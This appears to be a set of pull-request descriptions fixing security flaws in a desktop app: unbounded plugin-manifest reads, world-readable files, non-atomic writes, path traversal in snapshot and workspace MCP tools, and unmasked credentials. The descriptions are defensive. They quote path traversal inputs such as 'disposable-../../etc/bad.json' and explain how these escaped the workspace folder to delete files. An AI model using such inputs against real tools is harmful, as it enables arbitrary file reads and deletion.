+All 12 existing tests preserved unchanged. 18 new tests:
+=== PR 905 ===
+KhushiTrivediii
+## Summary
+
+Fixes #857
+
+A plugin JAR's `plugin.json` entry was read **unbounded** in three places, all running *before* signature verification:
+
+1. `PluginManifestReader.readFromJar` (plugin-loader)
+2. `LocalPluginRepository.readPluginFromJar` (~line 178)
+3. `LocalPluginRepository.readPluginId` (~line 220)
+
+All three used `jar.getInputStream(manifestEntry).bufferedReader().readText()` with no size limit. ZIP DEFLATE streams inflate at high ratios, so a small hostile JAR can declare a large manifest entry that OOMs the host during a directory scan — before the signature check that would reject it ever runs.
+
+## Changes
+
+**New file: `BoundedManifestReader.kt`** (plugin-loader, desktopMain)
+- Shared bounded-read helper with `MAX_MANIFEST_BYTES = 512 KB`
+- `readBoundedText(stream, maxBytes)` reads at most `maxBytes + 1` bytes; throws `PluginManifestException` if the entry exceeds the cap
+- 512 KB covers every legitimate manifest (the largest in the repo is a few KB) with orders of magnitude to spare
+- Lives in plugin-loader so both plugin-loader and plugin-repository (which depends on plugin-loader) share one copy
+
+**Patched: `PluginManifestReader.kt`**
+- Line 60: replaced unbounded `readText()` with `BoundedManifestReader.readBoundedText()`
+
+**Patched: `LocalPluginRepository.kt`**
+- Line 182 (`readPluginFromJar`): replaced unbounded `readText()` with bounded read
+- Line 224 (`readPluginId`): replaced unbounded `readText()` with bounded read
+- Added import for `BoundedManifestReader`
+- Both sites already `runCatching` around the read and skip-as-malformed on failure, so no new failure handling is needed
+
+## Tests
+
+**`BoundedManifestReaderTest.kt`** (plugin-loader, 11 tests)
+- Direct cap enforcement: cap-1 succeeds, exactly cap succeeds, cap+1 throws
+- Empty stream returns empty string
+- Default `MAX_MANIFEST_BYTES` cap succeeds and rejects oversize
+- Integration with `PluginManifestReader.readFromJar`: oversize rejected
+- Integration with `PluginManifestReader.hasValidManifest`: oversize returns false, valid small returns true
+
+**`LocalPluginRepositoryBoundedManifestTest.kt`** (plugin-repository, 3 tests)
+=== PR 887 ===
+KhushiTrivediii
+### Summary
+Fixes file permission security and non-atomic write vulnerabilities (Issue #860) and unbounded manifest entry read OOM vulnerabilities (Issue #857).
+
+### Root Cause & Vulnerabilities
+
+1. **File Permissions & Non-Atomic Writes (Issue #860)**:
+   - `atomicWriteText` previously created temporary files with umask-inherited permissions (0644), leaving sensitive user state files world-readable on stock multi-user desktops.
+   - `DashboardStatsManager.saveImmediately` and `CodeBase.saveRecentProjects` wrote data in-place using `writeText`, risking torn JSON and data loss on mid-write crashes.
+
+2. **Unbounded Manifest Reads (Issue #857)**:
+   - `PluginManifestReader.readFromJar`, `LocalPluginRepository.readPluginFromJar`, and `LocalPluginRepository.readPluginId` read `plugin.json` ZIP streams without size bounds before signature verification.
+   - A synthetic or hostile JAR containing a padded manifest entry could stall or OOM the host during directory scanning.
+
+### Solution
+
+1. **File Permissions & Persistence**:
+   - Updated `atomicWriteText` in `AtomicFileWrite.kt` to explicitly pin POSIX owner-only (`0600` / `rw-------`) permissions on temporary sibling files before executing atomic moves.
+   - Migrated `DashboardStatsManager` and `CodeBase.saveRecentProjects` to `atomicWriteText`.
+   - Added unit test in `AtomicFileWriteTest` verifying POSIX owner-only permissions.
+
+2. **Bounded Manifest Reads**:
+   - Introduced `MAX_MANIFEST_BYTES = 512 * 1024L` (512 KB) and `readBoundedManifestText` helper in `PluginManifestReader.kt`.
+   - Updated `LocalPluginRepository.kt` (`readPluginFromJar` and `readPluginId`) to read manifests via `readBoundedManifestText`, gracefully skipping oversized manifests as malformed.
+   - Added `PluginManifestReaderTest` verifying that manifests > 512 KB throw `PluginManifestException` and prevent OOM.
+   - Added `LocalPluginRepositoryBoundedReadTest` verifying oversized manifests are skipped during repository listing.
+
+### Verification
+- `./gradlew :composeApp:desktopTest --tests "ai.rever.boss.utils.AtomicFileWriteTest"` (PASSED)
+- `./gradlew :plugin-platform:plugin-loader:desktopTest` (PASSED)
+- `./gradlew :plugin-platform:plugin-repository:desktopTest` (PASSED)
+- `./gradlew :composeApp:ktlintCheck` (PASSED)
+- `./gradlew :composeApp:detekt` (PASSED)
+
+=== PR 883 ===
+KhushiTrivediii
+### Summary
+Fixes path traversal in `SnapshotManager` (Issue #873) and concurrency/non-atomic write issues in `SettingsServiceImpl` (Issue #871).
+
+### Root Cause & Vulnerabilities
+
+1. **SnapshotManager (Issue #873)**:
+   - `processId` was unvalidated, allowing path traversal (`../`) to break out of `dataDir/snapshots`.
+   - Files were saved in-place using non-atomic writes (`writeBytes`), leaving empty/corrupt `.snapshot` files on crash.
+
+2. **SettingsServiceImpl (Issue #871)**:
+   - Concurrent gRPC `setSetting` calls raced without mutex synchronization on `saveToDisk()`.
+   - `settingsFile.writeText` truncated the file in-place, risking total config loss on mid-write crashes.
+   - Storage path was hardcoded to `user.home/.boss/settings.json`, blocking test isolation.
+
+### Solution
+
+1. **SnapshotManager**:
+   - Validated `processId` against regex `^[A-Za-z0-9_-][A-Za-z0-9._-]{0,199}$` and verified normalized path confinement to `snapshots/`.
+   - Implemented atomic persistence via `.tmp` sibling files and `StandardCopyOption.ATOMIC_MOVE`.
+   - Pinned owner-only POSIX (0600) permissions where supported.
+   - Added unit tests in `SnapshotManagerTest` covering path traversal rejection.
+
+2. **SettingsServiceImpl**:
+   - Added constructor parameter `storageFile: File` for test isolation.
+   - Serialized `setSetting` mutations and saves with a `Mutex`.
+   - Implemented atomic disk persistence via `.tmp` sibling files and `StandardCopyOption.ATOMIC_MOVE`.
+   - Pinned owner-only POSIX (0600) permissions where supported.
+   - Added `SettingsServiceImplTest` covering CRUD operations, custom storage isolation, and concurrent write safety.
+
+### Verification
+- `./gradlew :boss-orchestrator:test` (PASSED)
+- `./gradlew :boss-service-settings:test` (PASSED)
+- `./gradlew :composeApp:ktlintCheck` (PASSED)
+- `./gradlew :composeApp:detekt` (PASSED)
+
+=== PR 882 ===
+choksi2212
+## Description
+
+Closes #813 (production scope per the #814 review's recommended handoff — this is the replacement for #814's original branch).
+
+The #814 review was right on both counts: the legacy `refresh()`/`clear()` pair has **no production callers**, and the real cross-window race is in **`refreshForWindow`** and **`alignCurrentProjectPath`** — both wrote the shared GLOBAL `currentProjectPath` from any window's coroutine with no ordering, and a refresh started before a project switch and finished after it repointed the global at a project the user had already left (the file/ref diff verbs then read the wrong worktree — the exact two-worktree `git restore` misdirection the code's own comments describe).
+
+**The fix — a monotonic project epoch, exactly the review's recommended shape:**
+
+- `refreshForWindow` captures the epoch at entry and publishes the global seed **only under the mutex and only if the epoch is unchanged** — a switch that landed while the refresh waited (or while its git subprocesses ran) bumped the epoch and the stale publish is dropped. The window-scoped `WindowGitState` still refreshes; only the global seed for the diff verbs is refused.
+- `alignCurrentProjectPath` is the **switch verb** and always wins: it bumps the epoch and writes under the same lock, non-suspending per the expect signature.
+- The unused legacy `refresh()`/`clear()` surface keeps the first pass's mutex but its KDoc now states it has no production callers (kept for the top-bar path) — no longer presented as the fix.
+
+## 🔄 Type of Change
+
+- [x] 🐛 **Bug fix** (non-breaking change that fixes an issue)
+- [x] Redesign per maintainer review — supersedes #814's original scope
+
+## 📦 Version Impact
+
+- [x] **Patch version** (bug fix; the automated version system can decide)
+
+## ✅ Testing Checklist
+
+### 🧪 **Local Testing**
+
+- [x] 3/3 in the new `GitRefreshEpochTest`, all deterministic per the review's requirements — no scheduling luck:
+  - `two racing window refreshes leave a self-consistent global, never a cross-project mix` — real temp git repos, real `WindowGitState`s, parallel `async` refreshes; the global names one of the refreshed projects and each window keeps its own state
+  - `a refresh that started before a switch cannot repoint the global afterwards` — the test seam hands the refresh the pre-switch epoch (captured exactly as production does), the switch runs first, the stale publish is refused, and the window's own state still refreshed
+  - `align from a window always repoints the global - it is the switch verb` — the switch itself is never dropped
+- [x] The existing `GitProviderWritesToRepoTest` suite passes unchanged (the write-verb `projectPathOverride` path is untouched)
+- [x] detekt + ktlint + tests green in one local run
+
+### 🖥️ **Platform Testing**
+
+- [x] 🪟 **Windows** - Tested and working (local; real git subprocesses in temp dirs)
+
+### 🏗️ **Build Verification**
+
+- [x] Tests + detekt + ktlint green in one local run
+=== PR 881 ===
+KhushiTrivediii
+### Summary
+Fixes path traversal vulnerabilities in `open_workspace` (Issue #856) and arbitrary file deletion in `close_workspace` (Issue #862) MCP tools.
+
+### Root Cause & Vulnerability
+In `WorkspaceMcpToolProvider.kt`:
+1. `open_workspace` and `close_workspace` previously checked `if (workspaceId.endsWith(".json")) workspaceId else WorkspaceFileManagerCommon.fileNameForId(workspaceId)`.
+2. When `workspaceId` ended in `.json` and contained `../` path traversal components (e.g. `disposable-../../etc/bad.json`), `fileName` became `"disposable-../../etc/bad.json"`, bypassing `WorkspaceFileManagerCommon.fileNameForId` sanitization.
+3. In `open_workspace`, it additionally attempted `fileManager.loadWorkspace(workspaceId)` with the raw un-sanitized ID as a fallback.
+4. In `close_workspace`, if `workspaceId` contained `disposable` and ended with `.json`, `getFileManager().deleteWorkspace(fileName)` resolved relative path traversal out of the workspace directory, enabling arbitrary file deletion.
+
+### Fix
+- Stripped `.json` suffix if present (`workspaceId.removeSuffix(".json")`) and forced sanitization via `WorkspaceFileManagerCommon.fileNameForId(...)` in both `open_workspace` and `close_workspace`.
+- Removed the raw un-sanitized fallback in `open_workspace`.
+- Added unit tests in `WorkspaceMcpToolProviderTest.kt` verifying path traversal payloads in `open_workspace` and `close_workspace` are safely sanitized to stay within the workspace directory.
+
+### Verification
+- `./gradlew :composeApp:desktopTest --tests "ai.rever.boss.mcp.WorkspaceMcpToolProviderTest"` (PASSED)
+- `./gradlew :composeApp:ktlintCheck` (PASSED)
+- `./gradlew :composeApp:detekt` (PASSED)
+
+=== PR 879 ===
+KhushiTrivediii
+Fixes #836
+
+## Summary
+- Widened value matching class in `sensitiveAssignment` regex in `McpArgumentSanitizer.kt` to capture optional authentication schemes (`Bearer`, `Basic`, `Token`, `Negotiate`).
+- Prevents `Authorization: Bearer <token>` from leaving `<token>` unmasked while masking only the label.
+- Added URI userinfo redaction (`scheme://user:[REDACTED]@host`) for postgres, mongodb, redis, http/s, git, and ssh credentials.
+- Added unit tests in `McpArgumentSanitizerRedactionTest`.
+
+=== PR 907 ===
+KhushiTrivediii
+## Summary
+
+Fixes #873
+
+Three security vulnerabilities in `SnapshotManager`:
+
+### 1. Path Traversal via Unvalidated `processId`
+
+`snapshotDir()` constructed paths via `File(dataDir, "snapshots/$processId")` with no validation. A `processId` like `../../etc` escaped the snapshots directory, allowing:
+- Arbitrary file creation (`save()`)
+- Arbitrary file deletion (`cleanup()` lists `.snapshot` files and calls `file.delete()`)
+- Arbitrary file reads (`loadLatest()`, `listSnapshots()`)
+
+**Fix:** Validate `processId` against `^[A-Za-z0-9_-][A-Za-z0-9._-]{0,199}$` (rejects path separators, double-dots, blank strings, trailing dots). Additionally verify the canonical resolved path stays within the snapshots base directory (defence in depth). Read-only operations (`loadLatest`, `listSnapshots`, `cleanup`) use `resolveSnapshotDir()` which returns `null` for invalid IDs instead of throwing.
+
+### 2. Non-Atomic File Truncation
+
+`save()` used `writeBytes()`/`writeText()` directly, so a crash mid-write left a truncated `.snapshot` file. `loadLatest()` picks the max-timestamp file, meaning recovery would select the corrupt partial file and fail.
+
+**Fix:** Write to a temp sibling (`.name.tmp`) first, then atomically move into place via `ATOMIC_MOVE` (with `REPLACE_EXISTING` fallback for cross-volume on Windows). The target file is never visible in a partial state.
+
+### 3. Umask-Inherited Permissions
+
+Snapshot files (which may contain sensitive process state, environment variables, or config) were written with default umask permissions (0644), readable by other local users on multi-user systems.
+
+**Fix:** Create temp files with POSIX owner-only permissions (`rw-------`) via `Files.createFile` with a `PosixFileAttribute`, and re-assert 0600 before the move. Non-POSIX platforms (Windows) silently skip the permission setting.
+
+## Changes
+
+**`SnapshotManager.kt`** (rewritten, 91 → 231 lines):
+- Added `processIdPattern` regex and validation in `snapshotDir()`
+- Added `resolveSnapshotDir()` for read-only operations (returns null for invalid)
+- Added `atomicWrite()` / `atomicWriteText()` with temp-file + `ATOMIC_MOVE` + POSIX 0600
+- Updated `save()`, `loadLatest()`, `listSnapshots()`, `cleanup()` to use new methods
+- Added `supportsPosix` detection
+
+## Tests (`SnapshotManagerTest.kt`, 12 → 30 tests)
+
+All 12 existing tests preserved unchanged. 18 new tests:
